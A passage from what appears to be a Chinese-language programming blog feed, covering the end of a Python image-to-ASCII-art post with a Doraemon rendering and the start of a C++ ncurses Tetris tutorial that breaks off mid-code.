class="comment">#&#x8F93;&#x5165;&#x6587;&#x4EF6;</span></span><br><span class="line">parser.add_argument(<span class="string">&apos;-o&apos;</span>, <span class="string">&apos;--output&apos;</span>)   <span class="comment">#&#x8F93;&#x51FA;&#x6587;&#x4EF6;</span></span><br><span class="line">parser.add_argument(<span class="string">&apos;--width&apos;</span>, type = int, default = <span class="number">80</span>) <span class="comment">#&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x753B;&#x5BBD;</span></span><br><span class="line">parser.add_argument(<span class="string">&apos;--height&apos;</span>, type = int, default = <span class="number">80</span>) <span class="comment">#&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x753B;&#x9AD8;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x83B7;&#x53D6;&#x53C2;&#x6570;</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">IMG = args.file</span><br><span class="line">WIDTH = args.width</span><br><span class="line">HEIGHT = args.height</span><br><span class="line">OUTPUT = args.output</span><br><span class="line"></span><br><span class="line">ascii_char = list(<span class="string">&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&apos;. &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5C06;256&#x7070;&#x5EA6;&#x6620;&#x5C04;&#x5230;70&#x4E2A;&#x5B57;&#x7B26;&#x4E0A;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_char</span><span class="params">(r,g,b,alpha = <span class="number">256</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> alpha == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&apos; &apos;</span></span><br><span class="line">    length = len(ascii_char)</span><br><span class="line">    gray = int(<span class="number">0.2126</span> * r + <span class="number">0.7152</span> * g + <span class="number">0.0722</span> * b)</span><br><span class="line"></span><br><span class="line">    unit = (<span class="number">256.0</span> + <span class="number">1</span>)/length</span><br><span class="line">    <span class="keyword">return</span> ascii_char[int(gray/unit)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line"></span><br><span class="line">    im = Image.open(IMG)</span><br><span class="line">    im = im.resize((WIDTH,HEIGHT), Image.NEAREST)</span><br><span class="line"></span><br><span class="line">    txt = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(HEIGHT):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(WIDTH):</span><br><span class="line">            txt += get_char(*im.getpixel((j,i)))</span><br><span class="line">        txt += <span class="string">&apos;\n&apos;</span></span><br><span class="line"></span><br><span class="line">    print(txt)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#x5B57;&#x7B26;&#x753B;&#x8F93;&#x51FA;&#x5230;&#x6587;&#x4EF6;</span></span><br><span class="line">    <span class="keyword">if</span> OUTPUT:</span><br><span class="line">        <span class="keyword">with</span> open(OUTPUT,<span class="string">&apos;w&apos;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(txt)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&apos;w&apos;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(txt)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5904;&#x7406;&#x8FC7;&#x4E4B;&#x540E;&#x7684;&#x201C;&#x54C6;&#x5566;A&#x68A6;&#x201D;&#xFF1A;</p><pre><code>                      $$$$                                                     $$d0x0o#uxx0z#$$                                              $WcxxxxW   &quot;kx}  &quot;hd$                                          $qxxxxxxJ     &quot;c     Wxd$                                      $#xxxxxxxch      #      cxu$                                    $uxxxxxxxxk&gt;    p&quot;-  h}  #xxxB                                 $0xxxxxxxxxx#    # n &quot;h I# nxxxx$                               $Yxxxxxxxxxxx#    I  }C     -qcxxx$                             $Yxxxxxxxxxxxq#(      &quot;-     z  -occ$                            $xxxxxxxxxxc#(Ip      ( COC( h    pu$                           $xxxxxxxxxuh    &quot;&gt;     n}p zk8&quot;     &quot;8$$$                        mxxxxxxxxk&quot;      &gt;C  ff &amp;\  kk    }#&gt;#   $                      $xxxxxxxx# -Cp}          ok\kkk&gt; C(       &quot;$                     cxxxxxxxW       }zh(     @kkkko &gt;          $                    $xxxxxxxq             }h   8kko(            p                    mxxxxxxx&gt;                    -    #pnf----I p                   $xxxxxxuW   &gt;nn---I           O              $                   $xxxxxx#&quot;              -&gt;     p             I                    Wxxxxxx&gt;                      n-   OhnI     $                    qxxxxx0     }&amp;%%%pOn}I  ((    -n        }Oh$                     Jxxxxx#    &quot;kkkkkkka8%*aW%pn- -n        }CI$                     Jxxxxxp    -kkkkkWB8akkkkkkoWBhp}I    &gt;z#  $                     cxxxxx}    nk*%okkkkkkkkkkkkkkkkkkkkkkkk&quot;  $                     Jxxxxx     nkkkkkkkkkkkkkkkkkkkkkkkkkkk%   $                     Jxxxxx     Ikkkkkkkkkkkkkkkkkkkkkkkkkkk-                         qxxxxx      akkkkkkkkkkkkkkkkkkkkkkkkkB   f                      Wxxxxx      8kkkaW%8#kkkkkkkkkkkkkkkkh&quot;   8                      $xxxxx      Ik&amp;YffffffQBhkkkkkkkkkkkkO   z$                      $xxxxx(      $ffffffffffx@kkkkkkkkkkB    $                        mxxxx#      &quot;ufffffffffffbkkkkkkkk#    I                         $xxxxY       nffffffffffffMkkkkkka&quot;    8                          uxxxxf       hffffffffffffWkkkka&gt;    I                           qxxxx#       &quot;Qfffffffffff%kkkkW     O                           $xxxxcp       &quot;bffffffffffckkk8     &quot;$                            dxxxxc         omfffffffffa8C      $                             $xxxxxW          CQffffffQz       8                               $xxxxx}           &gt;hbpo(        8                                 #xxxxY&quot;      -(O%$}  IBkkkkkkkoB                                  0xxxx0 &gt;O%*kkkkB      k#j&gt;Ij#kk$                                 $Jxxm8akkkkoWW&amp;&quot;       Jwj1j0C($                                  $$okkk*&amp;Lxxxxd        h_IIIIM $                                  $Wkh8qxxxxxxx#        OIIXbIX *                                   $mxxxxxxxxxxq        aII[wI# z                                    cxxxxxxxxxxxI       uIII\j  -                                    Jxxxxxxxxxxxp      fhIII_h  &gt;                                    kxxxxxxxxxxx0p    n&quot;  -(                                         $xxxxxxxxxJh  &gt;p8#phpCnnnCppI$    $$$                            $xxxxxxuWcx  pf             p$ $}    n$                          $xxxJ#dxxx0  n              n$8       f                           xxxxxxxxx#  p              z$         $                          Jxxxxxxxx#  O              h&quot;         h                          kxxxxxxxx#   &quot;            &quot;8          O                          Bxxxxxxxxm   p            pI          p                      $$$ $xxxxxxxxxI   h         &quot;O}           8                     #kkk$$xxxxxxxxx8    &quot;hn- --zO  $           $                    $kkkk%$xxxxxxxxxJ      -npnn-  fh           $                    $kkkkM$xxxxxxxxxxk            CxC          }                      akkk$$xxxxxxxxxxxq&gt;         Wxxz          $                      $$$$ Bxxxxxxxxxxxxx8}    fhcxxxh         I                            qxxxxxxxxxxxxxxxxJYxxxxxxxm         $                            JxxxxxxxxxxxxxxxxxxxxxxxJd#(       h                           $$xxxxxxxxxxxxxxxxxxxJW$$    $-     8                           h&quot; xxxxxxxxxxxxxxxxc@$          $pp$$                           $   uxxxxxxxxxxxxx0$                                             O   #xxxxxxxxxxxJ$                                               &gt;   &gt;xxxxxxxxxu$                                                      Cxxxxxxuk$                                                        #xxxxx8$                                                          (ocJ$                                                     -          8                                                     O                                                                $           $                                                     O          $                                                      $&quot;       n                                                        $*I    p$                                                           $$$                                                  </code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>using c++ to realize Tetris</title>
      <link href="/2018/10/01/using-c-to-realize-Tetris/"/>
      <url>/2018/10/01/using-c-to-realize-Tetris/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1513155659728.png" alt=""></p><a id="more"></a><p>&#x8FD9;&#x4E24;&#x5929;&#x5B66;&#x4E60;&#x4E86;&#x4E00;&#x4E0B;&#x600E;&#x4E48;&#x7528;c++&#x6765;&#x5B9E;&#x73B0;&#x4FC4;&#x7F57;&#x65AF;&#x65B9;&#x5757;&#xFF0C;&#x867D;&#x7136;&#x6700;&#x540E;&#x7684;&#x754C;&#x9762;&#x5F88;&#x611F;&#x4EBA;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FD8;&#x662F;&#x5B66;&#x5230;&#x4E86;&#x4E0D;&#x5C11;&#x7684;&#x4E1C;&#x897F;&#x3002;<br>code&#xFF1A;</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ncurses.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> &amp;a, <span class="keyword">int</span> &amp;b)</span></span>{</span><br><span class="line"><span class="keyword">int</span> t=a;</span><br><span class="line">a = b;</span><br><span class="line">b = t;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrand</span><span class="params">(<span class="keyword">int</span> min, <span class="keyword">int</span> max)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span>(min+rand()%(max-min+<span class="number">1</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">WINDOW *<span class="title">create_newwin</span><span class="params">(<span class="keyword">int</span> height,<span class="keyword">int</span> width,<span class="keyword">int</span> starty,<span class="keyword">int</span> startx)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destory_win</span><span class="params">(WINDOW *local_win)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> game_win_height=<span class="number">30</span>;</span><br><span class="line"><span class="keyword">int</span> game_win_width=<span class="number">45</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hint_win_height=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> hint_win_width=<span class="number">20</span>;</span><br><span class="line">WINDOW * game_win, *hint_win ,*score_win;</span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Piece</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line"><span class="keyword">int</span> shape; </span><br><span class="line"><span class="keyword">int</span> next_shape;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> head_x;<span class="comment">// &#x5F53;&#x524D;&#x65B9;&#x5757;&#x9996;&#x4E2A;box&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line"><span class="keyword">int</span> head_y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> size_h;</span><br><span class="line"><span class="keyword">int</span> size_w;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> next_size_h;</span><br><span class="line"><span class="keyword">int</span> next_size_w;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> box_shape[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> next_box_shape[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> box_map[<span class="number">30</span>][<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> game_over;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initial</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_shape</span><span class="params">(<span class="keyword">int</span> &amp;cshape, <span class="keyword">int</span> box_shape[][<span class="number">4</span>],<span class="keyword">int</span> &amp;size_w, <span class="keyword">int</span> &amp; size_h)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">score_next</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">judge</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isaggin</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">exsqr</span><span class="params">(<span class="keyword">int</span> row)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">initscr();</span><br><span class="line"><span class="comment">//raw();</span></span><br><span class="line">cbreak();</span><br><span class="line">noecho();</span><br><span class="line">curs_set(<span class="number">0</span>);</span><br><span class="line">keypad(stdscr,TRUE);</span><br><span class="line"></span><br><span class="line">refresh();</span><br><span class="line"></span><br><span class="line">game_win = create_newwin(game_win_height, game_win_width, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">wborder(game_win, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>, <span class="string">&apos;*&apos;</span>);</span><br><span class="line">wrefresh(game_win);</span><br><span class="line"></span><br><span class="line">hint_win = create_newwin(hint_win_height, hint_win_width, <span class="number">0</span>, game_win_width+<span class="number">10</span>);</span><br><span class="line">mvprintw(<span class="number">0</span>, game_win_width+<span class="number">10</span>+<span class="number">2</span>,<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;Next&quot;</span>);</span><br><span class="line">refresh();</span><br><span class="line"></span><br><span class="line">score_win = create_newwin(hint_win_height, hint_win_width, <span class="number">20</span>, game_win_width+<span class="number">10</span>);</span><br><span class="line">mvprintw(<span class="number">20</span>, game_win_width+<span class="number">10</span>+<span class="number">2</span>,<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;Score&quot;</span>);</span><br><span class="line">refresh();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Piece* pp = <span class="keyword">new</span> Piece;</span><br><span class="line">pp-&gt;initial();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">pp-&gt;move();</span><br><span class="line"><span class="keyword">if</span>(pp-&gt;game_over)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">destory_win(game_win);</span><br><span class="line">destory_win(hint_win);</span><br><span class="line">destory_win(score_win);</span><br><span class="line"><span class="keyword">delete</span> pp;</span><br><span class="line">system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> row,col;</span><br><span class="line">getmaxyx(stdscr,row,col);</span><br><span class="line">mvprintw(row/<span class="number">2</span>,col/<span class="number">2</span> ,<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;GAMER OVER ! \n &quot;</span>);</span><br><span class="line">mvprintw(row/<span class="number">2</span>+<span class="number">2</span>,col/<span class="number">2</span><span class="number">-2</span> ,<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;Wait 5s to return tthe erminal ! \n &quot;</span>);</span><br><span class="line">refresh();</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line">endwin();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">WINDOW *<span class="title">create_newwin</span><span class="params">(<span class="keyword">int</span> height, <span class="keyword">int</span> width, <span class="keyword">int</span> starty, <span class="keyword">int</span> startx)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">WINDOW *local_win;</span><br><span class="line">local_win = newwin(height, width, starty, startx);</span><br><span class="line">box(local_win,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">wrefresh(local_win);</span><br><span class="line"><span class="keyword">return</span> local_win;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destory_win</span><span class="params">(WINDOW *local_win)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">wborder(local_win, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>, <span class="string">&apos; &apos;</span>);</span><br><span class="line">wrefresh(local_win);</span><br><span class="line">delwin(local_win);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Piece::initial()</span><br><span class="line">{</span><br><span class="line">score=<span class="number">0</span>;</span><br><span class="line">game_over=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;game_win_height;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;game_win_width;j++){</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span> || i==game_win_height<span class="number">-1</span> || j==<span class="number">0</span> || 